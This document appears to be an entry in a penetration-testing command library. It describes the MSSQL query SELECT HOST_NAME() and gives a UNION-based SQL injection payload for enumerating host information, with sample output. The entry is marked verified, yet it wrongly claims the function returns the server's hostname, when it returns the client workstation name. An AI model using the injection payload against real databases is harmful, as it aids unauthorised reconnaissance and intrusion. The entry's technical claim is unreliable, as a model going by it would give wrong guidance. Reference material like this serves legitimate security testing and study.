---
type: command
executor: sql
data: SELECT HOST_NAME()
tags:
  - mssql
  - discovery
  - sql-injection
platforms:
  - Windows
  - MSSQL
verified: true
validated: true
---

# mssql-select-host-name

## Command

```sql
SELECT HOST_NAME()
```

## Description

This SQL command retrieves the hostname of the server on which the current MSSQL instance is running. It is commonly used in SQL injection payloads to enumerate system information during reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | No parameters; executes directly in MSSQL context | Yes |

## Examples

### Basic Usage

```sql
SELECT HOST_NAME()
```

### In Injection Payload

```sql
' UNION SELECT HOST_NAME() --
```

## Expected Output

A result set with one column containing the server's hostname, such as:

HOST_NAME()
------------
DBSERVER-01

## Related

- [[commands/mssql-select-server-hostname]]
- [[procedures/mssql-hostname-enumeration-via-sqli]]
